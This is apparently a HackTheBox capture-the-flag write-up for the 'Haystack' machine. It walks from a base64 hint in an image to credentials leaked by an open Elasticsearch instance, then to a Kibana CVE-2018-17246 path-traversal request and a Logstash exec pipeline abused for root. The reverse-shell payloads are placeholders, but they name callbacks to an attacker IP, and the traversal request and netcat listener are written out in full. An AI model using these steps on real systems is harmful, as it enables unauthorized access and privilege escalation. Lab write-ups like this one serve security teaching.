---
layout: post
title: "The Needle Spoke Spanish"
subtitle: "HTB Haystack, where a picture hides a sentence, a search engine hands out passwords, and a log line written in Spanish runs as root"
date: 2019-11-09 12:00:00 +0000
description: "A photo hides a hint, a search engine leaks the password, and a single line of Spanish in the right file gets executed as root."
image: /assets/og/the-needle-spoke-spanish.png
tags: [hackthebox, writeup]
---

Haystack is a box that keeps telling you the answer in a language you maybe don't read. The name is the joke and the map. There is a needle, the needle is hidden in a haystack, and the whole machine is a chain of haystacks you sift one secret out of. A photo holds a sentence. A search engine holds the password. A help-desk dashboard holds a way in. And a logging pipeline, the most boring service on the box, sits there reading every file in a folder and politely running any command it finds, as long as you phrase the request correctly. In Spanish. None of this is a memory-corruption trick. Every step is a service doing exactly what it was configured to do, for the wrong person.

```
        H A Y S T A C K
        ===============
        needle.jpg  →  strings  →  base64  →  "la clave"
                            |
                            v
        elasticsearch (:9200) hands back the password
        like a search result, because to it, it is one
                            |
                            v
        ssh in. kibana on :5601 reads a file it shouldn't.
        logstash reads a line of spanish and runs it as root.
                                                    針
```

## 0x01 · the photo

Three ports answer, and the lineup is unusual enough to read like a confession.

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    nginx 1.12.2
9200/tcp open  http    nginx 1.12.2
```

Port 80 serves a single image, `needle.jpg`, and nothing else. No links, no forms, no source comments worth a second look. Just a needle, sitting in a field. The other oddity is port 9200, a second web server living up high. Anyone who has run a logging stack feels a small jolt of recognition there, because 9200 is the front door of Elasticsearch, a search engine that stores documents and answers questions about them over plain HTTP. Hold that thought. The box is showing you a search engine and a picture, and the picture is going to tell you what to search for.

Pull the picture apart with the bluntest tool there is. `strings` walks a file and prints every run of readable characters, the bits that look like words instead of binary noise.

```
$ wget http://10.10.10.115/needle.jpg
$ strings needle.jpg
...
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
```

That tail end is base64, the encoding that turns arbitrary bytes into a tidy block of letters so they survive being pasted into things. It is a costume, not a lock. Decode it.

```
$ echo 'bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==' | base64 -d
la aguja en el pajar es "clave"
```

The needle in the haystack is "clave." If your Spanish is rusty, `clave` means key, and it is also the literal word you are meant to search for. The image was never decoration. It was a sticky note left on the haystack telling you which straw to pull.

## 0x02 · the search engine that answers honestly

Elasticsearch on 9200 has no password here, which is its own quiet scandal but also the whole point of the box. Think of it like a library catalog left running on the front desk with no librarian. Ask it anything and it answers. First ask what it is holding by listing its indices, which are just its named buckets of documents.

```
$ curl -s 'http://10.10.10.115:9200/_cat/indices?v'
health index   docs.count  store.size
green  bank          1000      ...
green  quotes        253       ...
green  .kibana         1       ...
```

A `quotes` index with a couple hundred documents, and the photo told us to search them for `clave`. Elasticsearch speaks a JSON query language, but the lazy first pass is just to dump everything and grep. The documents come back base64-encoded, the same costume as before, so decode the hits.

```
$ curl -s 'http://10.10.10.115:9200/quotes/_search?size=1000' | grep -o '...clave...'
$ echo 'dXNlcjogc2VjdXJpdHk=' | base64 -d
user: security
$ echo 'cGFzczogc3BhbmlzaC5pcy5rZXk=' | base64 -d
pass: spanish.is.key
```

Two documents in that pile of quotes are not quotes at all. They are a username and a password someone stashed in the catalog, encoded just enough to feel hidden. `security` / `spanish.is.key`. The search engine handed them over because, to a search engine, a credential is just another result. It does not know the difference between a famous quotation and the keys to the house. It was never asked to.

```
$ ssh security@10.10.10.115
security@haystack:~$ cat user.txt
████████████████████████████████
```

## 0x03 · the dashboard with the open back door

The `security` user is a tourist with no real power, so the next haystack is the box's own running software. Two clues stack up. Elasticsearch almost never runs alone, and the index list already named `.kibana`. Kibana is the dashboard that draws charts on top of Elasticsearch, the pretty face for the search engine underneath. Check what is listening only on the inside of the machine.

```
security@haystack:~$ ss -tlnp | grep 127.0.0.1
LISTEN  127.0.0.1:5601   # kibana
```

Port 5601 is Kibana, bound to localhost so the outside world can't reach it. That binding is doing a lot of defensive work, and SSH lets us undo it in one line. Port forwarding tunnels a port on the box back to your own machine through the SSH session, like running a private extension cord from their wall socket to yours.

```
$ ssh -L 5601:127.0.0.1:5601 security@10.10.10.115
# now http://127.0.0.1:5601 on my machine is their kibana
```

Find the version (it advertises it in the UI and the API) and it is old enough to carry CVE-2018-17246. This is a local file inclusion bug, and Kibana being a Node.js app makes it nastier than the usual flavor. A normal LFI tricks a program into reading a file it shouldn't. This one tricks Kibana into reading a JavaScript file and then *running* it, because Node will happily execute any `.js` you can convince it to load. Picture a theater where the script reader doesn't check which script you handed them. They just start performing whatever is on the pages, on stage, for real. The console API endpoint takes a path and walks it with `../` sequences straight out of the app directory to anywhere on disk you can name.

So you need a malicious `.js` somewhere readable, and `/dev/shm` (a world-writable scratch directory that lives in RAM) is the classic drop spot. Write a small Node script whose only job is to phone home.

```
$ cat /dev/shm/iceberg.js
[ node.js reverse shell: spawn /bin/sh and pipe it over a socket back to 10.10.14.4 on 443 ]
```

Then point the vulnerable endpoint at it through the tunnel, traversing up and back down to the file.

```
$ curl 'http://127.0.0.1:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../../../../dev/shm/iceberg.js'
```

Kibana loads the path, sees JavaScript, and performs it. Start a listener first and the shell lands as the `kibana` user.

```
$ nc -lvnp 443
connect to [10.10.14.4] from haystack ...
$ id
uid=998(kibana) gid=996(kibana)
```

## 0x04 · the log line that ran as root

`kibana` is one rung up and still nowhere near root. The last haystack is the third member of the stack we haven't met yet. Elasticsearch stores, Kibana displays, and Logstash is the intake pipe that reads logs in, reshapes them, and forwards them on. Crucially, on this box Logstash runs as root, and the `kibana` user can read its config in `/etc/logstash/conf.d`. Read it, because a Logstash pipeline is just three rules: where to read, how to parse, and what to do with the result.

```
# input.conf  — where it reads
file { path => "/opt/kibana/logstash_*"  stat_interval => "10 second" }

# filter.conf — how it parses
grok { match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" } }

# output.conf — what it does
exec { command => "%{comando} &" }
```

Read those three together and your stomach should drop. Every ten seconds, Logstash reads any file in `/opt/kibana/` whose name starts with `logstash_`. For each line, the grok filter (grok is just named regex, a way to pull a labeled chunk out of a messy log line) looks for the Spanish phrase `Ejecutar comando :`, which means "Execute command :", and captures everything after it into a field called `comando`. Then the output stage takes that captured text and runs it on the shell. As root.

This is not a vulnerability in any code. It is a feature. Somebody built a pipeline that was meant to read trusted, internal log lines and act on them, and never once imagined an attacker would be allowed to write into the very folder it watches. But we are the `kibana` user, and `/opt/kibana` is ours. Think of it like a butler with a standing order to do whatever today's to-do list says, who never checks who wrote the list. Slip a line onto the list and it gets done, in his uniform, with his keys.

So write the file in exactly the format the filter is hunting for, with a reverse shell as the command.

```
$ echo 'Ejecutar comando : [ bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]' \
    > /opt/kibana/logstash_iceberg
```

Start a listener, wait out the ten-second poll, and Logstash reads your line, matches the phrase, captures your command, and runs it as the user it runs as.

```
$ nc -lvnp 443
connect to [10.10.14.4] from haystack ...
$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /root/root.txt
████████████████████████████████
```

The needle spoke Spanish the whole time, and the last haystack just needed the password phrased as a sentence the pipeline was trained to obey.

## 0x05 · the honest caveat

It is easy to read Haystack as a string of silly mistakes, an unauthenticated search engine, a password hidden in a photo, an old Kibana, a reckless log pipeline, and to assume your stack would never be this careless. But look at what actually links the four steps, because it is one idea wearing four costumes. Every stage trusted its input to stay inside the lines somebody imagined for it. Elasticsearch trusted that whoever queried it was allowed to. Kibana trusted that the path in a request pointed at a real plugin, not an attacker's script in RAM. Logstash trusted that the files in its watch folder were written by the system, not by a user who could reach that folder. None of these is a buffer overflow. Each is a service that drew its trust boundary one inch too generously and never checked the edge.

The Logstash step is the one worth losing sleep over, because nothing there is unpatched. There is no CVE to apply, no version to bump. A root process that reads files from a directory a lower user can write to, and executes what it finds, is doing precisely what its config tells it to. You cannot upgrade your way out of that. The fix is the unglamorous discipline of asking, for every automated thing that runs as root, where does its input come from, and who can touch that source. The CVE in the middle gets patched on a Tuesday. The trust boundary only gets fixed by someone drawing it on purpose.

## 0x06 · outro

```
the picture told you the word.
the search engine told you the password.
the dashboard ran a script you left in its memory.
and the log pipeline ran a sentence, because the sentence was in spanish
        and spoke the magic words.

four haystacks. one needle in each. none of them locked.
every service trusted its input to behave.

read the photo. mind the watch folder. wear black.

                                                            EOF
```

---

*HTB: Haystack, retired 02 Nov 2019. An easy Linux box that is really a four-act lesson in trusting your input, where the only exploit you fire is a single line of Spanish dropped in the right folder. The needle still speaks in a lab and nowhere you don't own.*